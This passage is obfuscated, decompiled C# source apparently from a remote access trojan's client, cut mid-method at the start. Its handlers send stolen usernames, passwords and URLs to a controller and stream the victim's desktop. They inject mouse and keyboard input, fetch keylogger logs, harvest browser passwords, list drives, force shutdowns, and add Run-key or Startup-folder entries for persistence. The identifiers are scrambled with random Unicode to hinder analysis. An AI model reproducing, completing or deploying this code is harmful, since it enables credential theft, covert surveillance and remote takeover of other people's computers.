      띱\uEE59\uF5AD\uEF8Eચ饶\uE0BDࢭ흽尋騄驪\u2E2E겐쬓\uF2C3\u4DD0軤\u2B43䂫 띱ચ饶ࢭ흽尋騄驪겐쬓軤䂫 = 띱ચ饶ࢭ흽尋騄驪겐쬓軤䂫List[index];
      string str = string.Format(띱ચ饶ࢭ흽尋騄驪겐쬓軤䂫.Username + "$E$" + 띱ચ饶ࢭ흽尋騄驪겐쬓軤䂫.Password + "$E$" + 띱ચ饶ࢭ흽尋騄驪겐쬓軤䂫.URL + "$E$" + 띱ચ饶ࢭ흽尋騄驪겐쬓軤䂫.Application);
      data.Add(str);
    }
    new GetPasswordsResponse(data).Execute(client);
  }

  public static void 踿\u2F40嵷䕑\u22C4鹁\uF2B9\u0FF7탩둙샇\uE675\uFFFD\uEF50ɐ徏\uF05B픣㑧\uE925(
    GetDesktop command,
    \u3100\uFFFD稾\uE4FB\u2F06涧ᒲ볡ꤏ硔鬆愆岇樌笱ộ婸\uEC5C囈භ client)
  {
    string resolution = 랭龱䴖裷\uA4B6䄵곷კ撳\uF8EAꗋ쟋ጃՑ䅍곑갡㸱䐼瞒.\u26AE炉텗粛\u2EAD멄㓴ꝥ㩕粻棳\uEB98\u00BF캲壨Ⰶ\uFFFD㟣홺\u0AF1(Ḍ㳩\uE731뢠칳䛱ꎗ崢輴珄㕄\uFFFD햟\uECA4䎉\uFFFD㻞\uE1C4㶎䄵.ஐ哣\uFFFD诨선魛ť\u0B34\uFFFDᚡ闱\uFFFD온級䮔\u2B12ߙ\uE7DF\u27CB\u2946(command.Monitor));
    if (쌽㗕ၐ呴ꏟ杖쾧綠时\uFFFD鯒\uFFFD鸲ヸ\uF83E\u22C9ሓ\u22EA鶊쎐.\uF04C珷ᩜ妟梏\uFFFD舋䨏\uE3C7젶\uF730隩猊캍阊ﵩ籁쟯\uFFFD觾 == null)
      쌽㗕ၐ呴ꏟ杖쾧綠时\uFFFD鯒\uFFFD鸲ヸ\uF83E\u22C9ሓ\u22EA鶊쎐.\uF04C珷ᩜ妟梏\uFFFD舋䨏\uE3C7젶\uF730隩猊캍阊ﵩ籁쟯\uFFFD觾 = new UnsafeStreamCodec(command.Quality, command.Monitor, resolution);
    if (쌽㗕ၐ呴ꏟ杖쾧綠时\uFFFD鯒\uFFFD鸲ヸ\uF83E\u22C9ሓ\u22EA鶊쎐.\uF04C珷ᩜ妟梏\uFFFD舋䨏\uE3C7젶\uF730隩猊캍阊ﵩ籁쟯\uFFFD觾.ImageQuality != command.Quality || 쌽㗕ၐ呴ꏟ杖쾧綠时\uFFFD鯒\uFFFD鸲ヸ\uF83E\u22C9ሓ\u22EA鶊쎐.\uF04C珷ᩜ妟梏\uFFFD舋䨏\uE3C7젶\uF730隩猊캍阊ﵩ籁쟯\uFFFD觾.Monitor != command.Monitor || 쌽㗕ၐ呴ꏟ杖쾧綠时\uFFFD鯒\uFFFD鸲ヸ\uF83E\u22C9ሓ\u22EA鶊쎐.\uF04C珷ᩜ妟梏\uFFFD舋䨏\uE3C7젶\uF730隩猊캍阊ﵩ籁쟯\uFFFD觾.Resolution != resolution)
    {
      쌽㗕ၐ呴ꏟ杖쾧綠时\uFFFD鯒\uFFFD鸲ヸ\uF83E\u22C9ሓ\u22EA鶊쎐.\uF04C珷ᩜ妟梏\uFFFD舋䨏\uE3C7젶\uF730隩猊캍阊ﵩ籁쟯\uFFFD觾?.Dispose();
      쌽㗕ၐ呴ꏟ杖쾧綠时\uFFFD鯒\uFFFD鸲ヸ\uF83E\u22C9ሓ\u22EA鶊쎐.\uF04C珷ᩜ妟梏\uFFFD舋䨏\uE3C7젶\uF730隩猊캍阊ﵩ籁쟯\uFFFD觾 = new UnsafeStreamCodec(command.Quality, command.Monitor, resolution);
    }
    BitmapData bitmapdata = (BitmapData) null;
    Bitmap bitmap = (Bitmap) null;
    try
    {
      bitmap = Ḍ㳩\uE731뢠칳䛱ꎗ崢輴珄㕄\uFFFD햟\uECA4䎉\uFFFD㻞\uE1C4㶎䄵.ጀ稨Ɡ滃ꡩ貸ুﾒ鏎魺ㅑⰤヅ뱦鉧䱰\uFFFD惻〹닲(command.Monitor);
      bitmapdata = bitmap.LockBits(new Rectangle(0, 0, bitmap.Width, bitmap.Height), ImageLockMode.ReadWrite, bitmap.PixelFormat);
      using (MemoryStream outStream = new MemoryStream())
      {
        if (쌽㗕ၐ呴ꏟ杖쾧綠时\uFFFD鯒\uFFFD鸲ヸ\uF83E\u22C9ሓ\u22EA鶊쎐.\uF04C珷ᩜ妟梏\uFFFD舋䨏\uE3C7젶\uF730隩猊캍阊ﵩ籁쟯\uFFFD觾 == null)
          throw new Exception("StreamCodec can not be null.");
        쌽㗕ၐ呴ꏟ杖쾧綠时\uFFFD鯒\uFFFD鸲ヸ\uF83E\u22C9ሓ\u22EA鶊쎐.\uF04C珷ᩜ妟梏\uFFFD舋䨏\uE3C7젶\uF730隩猊캍阊ﵩ籁쟯\uFFFD觾.CodeImage(bitmapdata.Scan0, new Rectangle(0, 0, bitmap.Width, bitmap.Height), new Size(bitmap.Width, bitmap.Height), bitmap.PixelFormat, (Stream) outStream);
        new GetDesktopResponse(outStream.ToArray(), 쌽㗕ၐ呴ꏟ杖쾧綠时\uFFFD鯒\uFFFD鸲ヸ\uF83E\u22C9ሓ\u22EA鶊쎐.\uF04C珷ᩜ妟梏\uFFFD舋䨏\uE3C7젶\uF730隩猊캍阊ﵩ籁쟯\uFFFD觾.ImageQuality, 쌽㗕ၐ呴ꏟ杖쾧綠时\uFFFD鯒\uFFFD鸲ヸ\uF83E\u22C9ሓ\u22EA鶊쎐.\uF04C珷ᩜ妟梏\uFFFD舋䨏\uE3C7젶\uF730隩猊캍阊ﵩ籁쟯\uFFFD觾.Monitor, 쌽㗕ၐ呴ꏟ杖쾧綠时\uFFFD鯒\uFFFD鸲ヸ\uF83E\u22C9ሓ\u22EA鶊쎐.\uF04C珷ᩜ妟梏\uFFFD舋䨏\uE3C7젶\uF730隩猊캍阊ﵩ籁쟯\uFFFD觾.Resolution).Execute(client);
      }
    }
    catch (Exception ex)
    {
      if (쌽㗕ၐ呴ꏟ杖쾧綠时\uFFFD鯒\uFFFD鸲ヸ\uF83E\u22C9ሓ\u22EA鶊쎐.\uF04C珷ᩜ妟梏\uFFFD舋䨏\uE3C7젶\uF730隩猊캍阊ﵩ籁쟯\uFFFD觾 != null)
        new GetDesktopResponse((byte[]) null, 쌽㗕ၐ呴ꏟ杖쾧綠时\uFFFD鯒\uFFFD鸲ヸ\uF83E\u22C9ሓ\u22EA鶊쎐.\uF04C珷ᩜ妟梏\uFFFD舋䨏\uE3C7젶\uF730隩猊캍阊ﵩ籁쟯\uFFFD觾.ImageQuality, 쌽㗕ၐ呴ꏟ杖쾧綠时\uFFFD鯒\uFFFD鸲ヸ\uF83E\u22C9ሓ\u22EA鶊쎐.\uF04C珷ᩜ妟梏\uFFFD舋䨏\uE3C7젶\uF730隩猊캍阊ﵩ籁쟯\uFFFD觾.Monitor, 쌽㗕ၐ呴ꏟ杖쾧綠时\uFFFD鯒\uFFFD鸲ヸ\uF83E\u22C9ሓ\u22EA鶊쎐.\uF04C珷ᩜ妟梏\uFFFD舋䨏\uE3C7젶\uF730隩猊캍阊ﵩ籁쟯\uFFFD觾.Resolution).Execute(client);
      쌽㗕ၐ呴ꏟ杖쾧綠时\uFFFD鯒\uFFFD鸲ヸ\uF83E\u22C9ሓ\u22EA鶊쎐.\uF04C珷ᩜ妟梏\uFFFD舋䨏\uE3C7젶\uF730隩猊캍阊ﵩ籁쟯\uFFFD觾 = (UnsafeStreamCodec) null;
    }
    finally
    {
      if (bitmap != null)
      {
        if (bitmapdata != null)
        {
          try
          {
            bitmap.UnlockBits(bitmapdata);
          }
          catch
          {
          }
        }
        bitmap.Dispose();
      }
    }
  }

  public static void \u2255窔\u2D6C缅\u2BBDퟵ逷䣌\u2913揄侫觴\u2868짻쵝㔲\u001A磒䈿䉺(
    DoMouseEvent command,
    \u3100\uFFFD稾\uE4FB\u2F06涧ᒲ볡ꤏ硔鬆愆岇樌笱ộ婸\uEC5C囈භ client)
  {
    try
    {
      Screen[] allScreens = Screen.AllScreens;
      int x = allScreens[command.MonitorIndex].Bounds.X;
      int y = allScreens[command.MonitorIndex].Bounds.Y;
      Point p = new Point(command.X + x, command.Y + y);
      switch (command.Action)
      {
        case 먄틍傘㭷賞\u2B2F䦳熀긗\uE821\uE79F꾒\uF672᳐Ӻେ\u2BC2\uE8B8䂻跘.엤\uFFFDd䦞ᆨᠩỖࣼඎЧ偳嗊瘖렜뺧綐局摞窦핯:
        case 먄틍傘㭷賞\u2B2F䦳熀긗\uE821\uE79F꾒\uF672᳐Ӻେ\u2BC2\uE8B8䂻跘.픔朹鸒Ⴅ䋑묰榪๋ḫ實䆉ኀ숊ᴝ版ẕ귍笞屩\uF030:
        case 먄틍傘㭷賞\u2B2F䦳熀긗\uE821\uE79F꾒\uF672᳐Ӻେ\u2BC2\uE8B8䂻跘.㝂漉\uFFFD氄㼰訆䛦貹充\u20F7ꏤ諵쮘㲟홋啿\uA7DD茙ರ\uFFE2:
        case 먄틍傘㭷賞\u2B2F䦳熀긗\uE821\uE79F꾒\uF672᳐Ӻେ\u2BC2\uE8B8䂻跘.\uE731䆓\uAB6D\uE55B\u0089ԇᴥ룣챽钩佞䊶냑脞埌뙶撾맭ᯝ\uE500:
        case 먄틍傘㭷賞\u2B2F䦳熀긗\uE821\uE79F꾒\uF672᳐Ӻେ\u2BC2\uE8B8䂻跘.ㄼޭﾇ샧晍鋼\uF428갍泌櫑场ᖈ\u0EF0Ц\u1CB9\uFE66跠\uEF16췬櫸:
          if (\u25C4\uE968茼\uFFFD䎆㗽耷\uFFFD\u0705緭쮫洴훅ツ삾\uE07D\u9FFA嘽㗝ꚠ.쑠혆熥쮨鴜䤱廣Ȉꩮ曅滦箋㓠ᤦ㪐凄㖴㣴跿㚁())
          {
            \u25C4\uE968茼\uFFFD䎆㗽耷\uFFFD\u0705緭쮫洴훅ツ삾\uE07D\u9FFA嘽㗝ꚠ.熌钀것붕䙆䄎ﶠﶼⱾ\u0D99蔠\u3194䩅᪴楥벑\u2445䕏칒㫌();
            break;
          }
          break;
      }
      switch (command.Action)
      {
        case 먄틍傘㭷賞\u2B2F䦳熀긗\uE821\uE79F꾒\uF672᳐Ӻେ\u2BC2\uE8B8䂻跘.엤\uFFFDd䦞ᆨᠩỖࣼඎЧ偳嗊瘖렜뺧綐局摞窦핯:
        case 먄틍傘㭷賞\u2B2F䦳熀긗\uE821\uE79F꾒\uF672᳐Ӻେ\u2BC2\uE8B8䂻跘.픔朹鸒Ⴅ䋑묰榪๋ḫ實䆉ኀ숊ᴝ版ẕ귍笞屩\uF030:
          \u25C4\uE968茼\uFFFD䎆㗽耷\uFFFD\u0705緭쮫洴훅ツ삾\uE07D\u9FFA嘽㗝ꚠ.\uF512뉻뒉\uA708ꖤ㶶\u1367旡匱䤁\uE797ᢕ\uE7D6ถᰟ埯\uF240킍ၩ\u2323(p, command.IsMouseDown);
          break;
        case 먄틍傘㭷賞\u2B2F䦳熀긗\uE821\uE79F꾒\uF672᳐Ӻେ\u2BC2\uE8B8䂻跘.㝂漉\uFFFD氄㼰訆䛦貹充\u20F7ꏤ諵쮘㲟홋啿\uA7DD茙ರ\uFFE2:
        case 먄틍傘㭷賞\u2B2F䦳熀긗\uE821\uE79F꾒\uF672᳐Ӻେ\u2BC2\uE8B8䂻跘.\uE731䆓\uAB6D\uE55B\u0089ԇᴥ룣챽钩佞䊶냑脞埌뙶撾맭ᯝ\uE500:
          \u25C4\uE968茼\uFFFD䎆㗽耷\uFFFD\u0705緭쮫洴훅ツ삾\uE07D\u9FFA嘽㗝ꚠ.䑕展긬\u2BE8쁴\uFFFD젔醃堉뒽\uFFFD雅\u259Cࢱ瞓柄莜䓚ᕨ\uF592(p, command.IsMouseDown);
          break;
        case 먄틍傘㭷賞\u2B2F䦳熀긗\uE821\uE79F꾒\uF672᳐Ӻେ\u2BC2\uE8B8䂻跘.ㄼޭﾇ샧晍鋼\uF428갍泌櫑场ᖈ\u0EF0Ц\u1CB9\uFE66跠\uEF16췬櫸:
          \u25C4\uE968茼\uFFFD䎆㗽耷\uFFFD\u0705緭쮫洴훅ツ삾\uE07D\u9FFA嘽㗝ꚠ.炘ٽ墢焃샕䩐ꮈꎴ㜷뎥麑헱絛㤊ঌ螙ᭂꑇ侁衦(p);
          break;
        case 먄틍傘㭷賞\u2B2F䦳熀긗\uE821\uE79F꾒\uF672᳐Ӻେ\u2BC2\uE8B8䂻跘.㻘\uFFFD礍錳谀\uE5E9ₖ屙互\uF040\uF5D5㟛䱮\uEF4Cힻ\uFFFDꏳ曂嶔㦠:
          \u25C4\uE968茼\uFFFD䎆㗽耷\uFFFD\u0705緭쮫洴훅ツ삾\uE07D\u9FFA嘽㗝ꚠ.勢賸Ꝧ鬟ﱂ힌䆙\uD7A6쩅穂믓\u2A83ᒏ蘩潤䅂蓾矖腘ዺ(p, false);
          break;
        case 먄틍傘㭷賞\u2B2F䦳熀긗\uE821\uE79F꾒\uF672᳐Ӻେ\u2BC2\uE8B8䂻跘.嶬鍐큵螕⁠彯䞈珎㸭䅤䀟묙瀠糆쯓ⶡ눽\uFFFD\uF45B\uA82B:
          \u25C4\uE968茼\uFFFD䎆㗽耷\uFFFD\u0705緭쮫洴훅ツ삾\uE07D\u9FFA嘽㗝ꚠ.勢賸Ꝧ鬟ﱂ힌䆙\uD7A6쩅穂믓\u2A83ᒏ蘩潤䅂蓾矖腘ዺ(p, true);
          break;
      }
    }
    catch
    {
    }
  }

  public static void 蓆\uEC40뼡\uEC19誼ᱟ謈\uE7DD봅鷹\uE4B1鹿ᗐ䎂\u26D2\uEADFﳅꪴڌ晊(
    DoKeyboardEvent command,
    \u3100\uFFFD稾\uE4FB\u2F06涧ᒲ볡ꤏ硔鬆愆岇樌笱ộ婸\uEC5C囈භ client)
  {
    if (\u25C4\uE968茼\uFFFD䎆㗽耷\uFFFD\u0705緭쮫洴훅ツ삾\uE07D\u9FFA嘽㗝ꚠ.쑠혆熥쮨鴜䤱廣Ȉꩮ曅滦箋㓠ᤦ㪐凄㖴㣴跿㚁())
      \u25C4\uE968茼\uFFFD䎆㗽耷\uFFFD\u0705緭쮫洴훅ツ삾\uE07D\u9FFA嘽㗝ꚠ.熌钀것붕䙆䄎ﶠﶼⱾ\u0D99蔠\u3194䩅᪴楥벑\u2445䕏칒㫌();
    \u25C4\uE968茼\uFFFD䎆㗽耷\uFFFD\u0705緭쮫洴훅ツ삾\uE07D\u9FFA嘽㗝ꚠ.唩\u2A4D掹돺\u260D팏\uF181깅捴肅捊龂딯괧\uEE78\uE90D\uFB1A䗎焤Ô(command.Key, command.KeyDown);
  }

  public static void \uE39A뱴ꅘ곖ᅖ斄뱏\uFFFĎ젼\u1C86\uEFD6슘흱븕瑾\u271CĎࢯﺎ(
    GetMonitors command,
    \u3100\uFFFD稾\uE4FB\u2F06涧ᒲ볡ꤏ硔鬆愆岇樌笱ộ婸\uEC5C囈භ client)
  {
    if (Screen.AllScreens.Length == 0)
      return;
    new GetMonitorsResponse(Screen.AllScreens.Length).Execute(client);
  }

  public static void 娻ᴍ\uFFFD쵍虁졀᷍媫鶆뗙ԓ庛\uF3B8鑩ᆄ롸䤎\uEBA6ⷲ\u1ADE(
    GetKeyloggerLogs command,
    \u3100\uFFFD稾\uE4FB\u2F06涧ᒲ볡ꤏ硔鬆愆岇樌笱ộ婸\uEC5C囈භ client)
  {
    // ISSUE: object of a compiler-generated type is created
    // ISSUE: reference to a compiler-generated method
    new Thread(new ThreadStart(new 쌽㗕ၐ呴ꏟ杖쾧綠时\uFFFD鯒\uFFFD鸲ヸ\uF83E\u22C9ሓ\u22EA鶊쎐.込\uE572佉弾ᾜƉ鍵큶ｼ휐ꡀ䩛曶驴뷾锹褩\uFFF4䘂ข()
    {
      \u1B61甆\uED01跃狟\u0F0Eꋨ啟緥\uFFFDԇⲛ磊\uFE6F㳵㛧\u29E8炟蘿쳠 = client
    }.ꅺꈣ到뺒신嗪鞖콭アꁓ鲃\u1CCE㸾舶슚䥍鸷瞯踽꫶)).Start();
  }

  public static string PassDirectory => Path.Combine(Path.GetTempPath(), "Chrome\\Directory\\Browsers\\");

  public static void 㧃꾨\uA721㖓\u2F55掸㹘暅䰂\uEE1D\uEA4B䛄歉챡\uF035봱糅\uE9DB庶\u2873(
    GetAllPasswords command,
    \u3100\uFFFD稾\uE4FB\u2F06涧ᒲ볡ꤏ硔鬆愆岇樌笱ộ婸\uEC5C囈භ client)
  {
    // ISSUE: object of a compiler-generated type is created
    // ISSUE: reference to a compiler-generated method
    new Thread(new ThreadStart(new 쌽㗕ၐ呴ꏟ杖쾧綠时\uFFFD鯒\uFFFD鸲ヸ\uF83E\u22C9ሓ\u22EA鶊쎐.闤騖ྥ밡\u26C1\uE488젏賩ꬳ뫄ᄤ\uEDA8ᐐ쐬鑽玫\u2F6D\uE578퐭\uE136()
    {
      藾밾ᥙ貚ᡜ\u2A13\uFFFD꺏彎\u2537͢\uEEE0砢ꦇ튩넰\uE125狨რ컢 = client
    }.\uE75E᭑丑ꅲ평ꌘ\uE78Cᢌ緂\uF2C8\uF2F1倢祃쟘\uE2C3濴\uE599껀椮\uEB00)).Start();
  }

  public static void 럆鶺\u2828ﰿ赢緶楽糜\uFFFD䱣毑눗ⶆ䝪\uEF19囔뢠់\uFFFD䊛(
    GetDrives command,
    \u3100\uFFFD稾\uE4FB\u2F06涧ᒲ볡ꤏ硔鬆愆岇樌笱ộ婸\uEC5C囈භ client)
  {
    DriveInfo[] array;
    try
    {
      array = ((IEnumerable<DriveInfo>) DriveInfo.GetDrives()).Where<DriveInfo>((Func<DriveInfo, bool>) (d => d.IsReady)).ToArray<DriveInfo>();
    }
    catch (IOException ex)
    {
      new SetStatusFileManager("GetDrives I/O error", false).Execute(client);
      return;
    }
    catch (UnauthorizedAccessException ex)
    {
      new SetStatusFileManager("GetDrives No permission", false).Execute(client);
      return;
    }
    if (array.Length == 0)
    {
      new SetStatusFileManager("GetDrives No drives", false).Execute(client);
    }
    else
    {
      string[] driveDisplayName = new string[array.Length];
      string[] rootDirectory = new string[array.Length];
      for (int index = 0; index < array.Length; ++index)
      {
        string str = (string) null;
        try
        {
          str = array[index].VolumeLabel;
        }
        catch
        {
        }
        if (string.IsNullOrEmpty(str))
          driveDisplayName[index] = string.Format("{0} [{1}, {2}]", (object) array[index].RootDirectory.FullName, (object) 랭龱䴖裷\uA4B6䄵곷კ撳\uF8EAꗋ쟋ጃՑ䅍곑갡㸱䐼瞒.ℶ홺瑝\u32BA핀鋎綗著\uF5C3䡗㦕饙\uFFFD멐ﭘ巿钋\uEDE0㱺㔹(array[index].DriveType), (object) array[index].DriveFormat);
        else
          driveDisplayName[index] = string.Format("{0} ({1}) [{2}, {3}]", (object) array[index].RootDirectory.FullName, (object) str, (object) 랭龱䴖裷\uA4B6䄵곷კ撳\uF8EAꗋ쟋ጃՑ䅍곑갡㸱䐼瞒.ℶ홺瑝\u32BA핀鋎綗著\uF5C3䡗㦕饙\uFFFD멐ﭘ巿钋\uEDE0㱺㔹(array[index].DriveType), (object) array[index].DriveFormat);
        rootDirectory[index] = array[index].RootDirectory.FullName;
      }
      new GetDrivesResponse(driveDisplayName, rootDirectory).Execute(client);
    }
  }

  public static void 來\uF76A饷埨\u1B5Dꨗ浡隩उ眀殻瓡ྫྷ诒쵿\uEEEF䇶雤\uF6DA\u1C39(
    DoShutdownAction command,
    \u3100\uFFFD稾\uE4FB\u2F06涧ᒲ볡ꤏ硔鬆愆岇樌笱ộ婸\uEC5C囈භ client)
  {
    try
    {
      ProcessStartInfo startInfo = new ProcessStartInfo();
      switch (command.Action)
      {
        case \uFFFD颊\u262Cꇟಊ\uE65D㬒黾苕孮魟霣ꑥ贠른\u1C7FĠ큯\uFFFD\uFFFD.豷牤㨘煛\u2F80䢚ꊓ쿧䒧ᓄ踀\uE62E廅빃섕䈊嚶ࠟ購첬:
          startInfo.WindowStyle = ProcessWindowStyle.Hidden;
          startInfo.UseShellExecute = true;
          startInfo.Arguments = "/s /t 0";
          startInfo.FileName = "shutdown";
          Process.Start(startInfo);
          break;
        case \uFFFD颊\u262Cꇟಊ\uE65D㬒黾苕孮魟霣ꑥ贠른\u1C7FĠ큯\uFFFD\uFFFD.괬捺噺म䰥ꥼ宛䣦\uE76B\u295A쓷䇒督鈂嬉䡑佧텮䅭ᕿ:
          startInfo.WindowStyle = ProcessWindowStyle.Hidden;
          startInfo.UseShellExecute = true;
          startInfo.Arguments = "/r /t 0";
          startInfo.FileName = "shutdown";
          Process.Start(startInfo);
          break;
        case \uFFFD颊\u262Cꇟಊ\uE65D㬒黾苕孮魟霣ꑥ贠른\u1C7FĠ큯\uFFFD\uFFFD.\u336C醅佪\u9FDE绀\uFFFDᬛ덀\u325B펢䛀ിɮ먢䱵밯篊ꑞᏕ伢:
          Application.SetSuspendState(PowerState.Suspend, true, true);
          break;
      }
    }
    catch (Exception ex)
    {
      new SetStatus(string.Format("Action failed: {0}", (object) ex.Message)).Execute(client);
    }
  }

  public static void 姍\u060F\u21CB䣁珔\uF46FⲋÓꗈ\uFFFD\u22C1\u3384\uE9BA펦痭濤譗\uE07Eꇌ舕(
    GetStartupItems command,
    \u3100\uFFFD稾\uE4FB\u2F06涧ᒲ볡ꤏ硔鬆愆岇樌笱ộ婸\uEC5C囈භ client)
  {
    try
    {
      List<string> startupitems = new List<string>();
      using (RegistryKey key = \u055D樥ꀃ隃猠廬௧䖞䓨\uF625껟狯\uE8C2詢腑\u292F\u0F1B敭옽\u0CE5.칃ꇗ㿽攈\u3291裦ᢝ\uFE5D닖掇㻍ꖇၵὖ謊赘\uEEB7温זּꨌ(RegistryHive.LocalMachine, "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run"))
      {
        if (key != null)
          startupitems.AddRange(key.GetFormattedKeyValues().Select<string, string>((Func<string, string>) (formattedKeyValue => "0" + formattedKeyValue)));
      }
      using (RegistryKey key = \u055D樥ꀃ隃猠廬௧䖞䓨\uF625껟狯\uE8C2詢腑\u292F\u0F1B敭옽\u0CE5.칃ꇗ㿽攈\u3291裦ᢝ\uFE5D닖掇㻍ꖇၵὖ謊赘\uEEB7温זּꨌ(RegistryHive.LocalMachine, "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\RunOnce"))
      {
        if (key != null)
          startupitems.AddRange(key.GetFormattedKeyValues().Select<string, string>((Func<string, string>) (formattedKeyValue => "1" + formattedKeyValue)));
      }
      using (RegistryKey key = \u055D樥ꀃ隃猠廬௧䖞䓨\uF625껟狯\uE8C2詢腑\u292F\u0F1B敭옽\u0CE5.칃ꇗ㿽攈\u3291裦ᢝ\uFE5D닖掇㻍ꖇၵὖ謊赘\uEEB7温זּꨌ(RegistryHive.CurrentUser, "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run"))
      {
        if (key != null)
          startupitems.AddRange(key.GetFormattedKeyValues().Select<string, string>((Func<string, string>) (formattedKeyValue => "2" + formattedKeyValue)));
      }
      using (RegistryKey key = \u055D樥ꀃ隃猠廬௧䖞䓨\uF625껟狯\uE8C2詢腑\u292F\u0F1B敭옽\u0CE5.칃ꇗ㿽攈\u3291裦ᢝ\uFE5D닖掇㻍ꖇၵὖ謊赘\uEEB7温זּꨌ(RegistryHive.CurrentUser, "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\RunOnce"))
      {
        if (key != null)
          startupitems.AddRange(key.GetFormattedKeyValues().Select<string, string>((Func<string, string>) (formattedKeyValue => "3" + formattedKeyValue)));
      }
      if (청瓧곴㩵栯僃䔵텑鏪䏫\u2E98슔头撤孖䵰傎ȍϯ띂.Is64Bit)
      {
        using (RegistryKey key = \u055D樥ꀃ隃猠廬௧䖞䓨\uF625껟狯\uE8C2詢腑\u292F\u0F1B敭옽\u0CE5.칃ꇗ㿽攈\u3291裦ᢝ\uFE5D닖掇㻍ꖇၵὖ謊赘\uEEB7温זּꨌ(RegistryHive.LocalMachine, "SOFTWARE\\Wow6432Node\\Microsoft\\Windows\\CurrentVersion\\Run"))
        {
          if (key != null)
            startupitems.AddRange(key.GetFormattedKeyValues().Select<string, string>((Func<string, string>) (formattedKeyValue => "4" + formattedKeyValue)));
        }
        using (RegistryKey key = \u055D樥ꀃ隃猠廬௧䖞䓨\uF625껟狯\uE8C2詢腑\u292F\u0F1B敭옽\u0CE5.칃ꇗ㿽攈\u3291裦ᢝ\uFE5D닖掇㻍ꖇၵὖ謊赘\uEEB7温זּꨌ(RegistryHive.LocalMachine, "SOFTWARE\\Wow6432Node\\Microsoft\\Windows\\CurrentVersion\\RunOnce"))
        {
          if (key != null)
            startupitems.AddRange(key.GetFormattedKeyValues().Select<string, string>((Func<string, string>) (formattedKeyValue => "5" + formattedKeyValue)));
        }
      }
      if (Directory.Exists(Environment.GetFolderPath(Environment.SpecialFolder.Startup)))
      {
        FileInfo[] files = new DirectoryInfo(Environment.GetFolderPath(Environment.SpecialFolder.Startup)).GetFiles();
        startupitems.AddRange(((IEnumerable<FileInfo>) files).Where<FileInfo>((Func<FileInfo, bool>) (file => file.Name != "desktop.ini")).Select<FileInfo, string>((Func<FileInfo, string>) (file => string.Format("{0}||{1}", (object) file.Name, (object) file.FullName))).Select<string, string>((Func<string, string>) (formattedKeyValue => "6" + formattedKeyValue)));
      }
      new GetStartupItemsResponse(startupitems).Execute(client);
    }
    catch (Exception ex)
    {
      new SetStatus(string.Format("Getting Autostart Items failed: {0}", (object) ex.Message)).Execute(client);
    }
  }

  public static void 勰嫃\uF199嗆ᓼ퀐쟸\uEF6A뽢꽎붸៓읆\u0BA6ߔ싊甛歷𣏕ꔲ(
    DoStartupItemAdd command,
    \u3100\uFFFD稾\uE4FB\u2F06涧ᒲ볡ꤏ硔鬆愆岇樌笱ộ婸\uEC5C囈භ client)
  {
    try
    {
      switch (command.Type)
      {
        case 0:
          if (\u055D樥ꀃ隃猠廬௧䖞䓨\uF625껟狯\uE8C2詢腑\u292F\u0F1B敭옽\u0CE5.鍁혏ū\uF328覥\uFE10㥥ダṯ\u328C猕눗嶵縌䊠銉\u2AA7\uF286\uEE99炍(RegistryHive.LocalMachine, "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", command.Name, command.Path, true))
            break;
          throw new Exception("Could not add value");
        case 1:
          if (\u055D樥ꀃ隃猠廬௧䖞䓨\uF625껟狯\uE8C2詢腑\u292F\u0F1B敭옽\u0CE5.鍁혏ū\uF328覥\uFE10㥥ダṯ\u328C猕눗嶵縌䊠銉\u2AA7\uF286\uEE99炍(RegistryHive.LocalMachine, "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\RunOnce", command.Name, command.Path, true))
            break;
          throw new Exception("Could not add value");
        case 2:
          if (\u055D樥ꀃ隃猠廬௧䖞䓨\uF625껟狯\uE8C2詢腑\u292F\u0F1B敭옽\u0CE5.鍁혏ū\uF328覥\uFE10㥥ダṯ\u328C猕눗嶵縌䊠銉\u2AA7\uF286\uEE99炍(RegistryHive.CurrentUser, "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", command.Name, command.Path, true))
            break;
          throw new Exception("Could not add value");
        case 3:
          if (\u055D樥ꀃ隃猠廬௧䖞䓨\uF625껟狯\uE8C2詢腑\u292F\u0F1B敭옽\u0CE5.鍁혏ū\uF328覥\uFE10㥥ダṯ\u328C猕눗嶵縌䊠銉\u2AA7\uF286\uEE99炍(RegistryHive.CurrentUser, "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\RunOnce", command.Name, command.Path, true))
            break;
          throw new Exception("Could not add value");
        case 4:
          if (!청瓧곴㩵栯僃䔵텑鏪䏫\u2E98슔头撤孖䵰傎ȍϯ띂.Is64Bit)
            throw new NotSupportedException("Only on 64-bit systems supported");
          if (\u055D樥ꀃ隃猠廬௧䖞䓨\uF625껟狯\uE8C2詢腑\u292F\u0F1B敭옽\u0CE5.鍁혏ū\uF328覥\uFE10㥥ダṯ\u328C猕눗嶵縌䊠銉\u2AA7\uF286\uEE99炍(RegistryHive.LocalMachine, "SOFTWARE\\Wow6432Node\\Microsoft\\Windows\\CurrentVersion\\Run", command.Name, command.Path, true))
            break;
          throw new Exception("Could not add value");
        case 5:
          if (!청瓧곴㩵栯僃䔵텑鏪䏫\u2E98슔头撤孖䵰傎ȍϯ띂.Is64Bit)
            throw new NotSupportedException("Only on 64-bit systems supported");
          if (\u055D樥ꀃ隃猠廬௧䖞䓨\uF625껟狯\uE8C2詢腑\u292F\u0F1B敭옽\u0CE5.鍁혏ū\uF328覥\uFE10㥥ダṯ\u328C猕눗嶵縌䊠銉\u2AA7\uF286\uEE99炍(RegistryHive.LocalMachine, "SOFTWARE\\Wow6432Node\\Microsoft\\Windows\\CurrentVersion\\RunOnce", command.Name, command.Path, true))
            break;
          throw new Exception("Could not add value");
        case 6:
          if (!Directory.Exists(Environment.GetFolderPath(Environment.SpecialFolder.Startup)))
            Directory.CreateDirectory(Environment.GetFolderPath(Environment.SpecialFolder.Startup));
          using (StreamWriter streamWriter = new StreamWriter(Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.Startup), command.Name + ".url"), false))
          {
            streamWriter.WriteLine("[InternetShortcut]");
            streamWriter.WriteLine("URL=file:///" + command.Path);
            streamWriter.WriteLine("IconIndex=0");
            streamWriter.WriteLine("IconFile=" + command.Path.Replace('\\', '/'));
            streamWriter.Flush();
            break;
          }
      }
    }
    catch (Exception ex)
    {
      new SetStatus(string.Format("Adding Autostart Item failed: {0}", (object) ex.Message)).Execute(client);
    }
  }

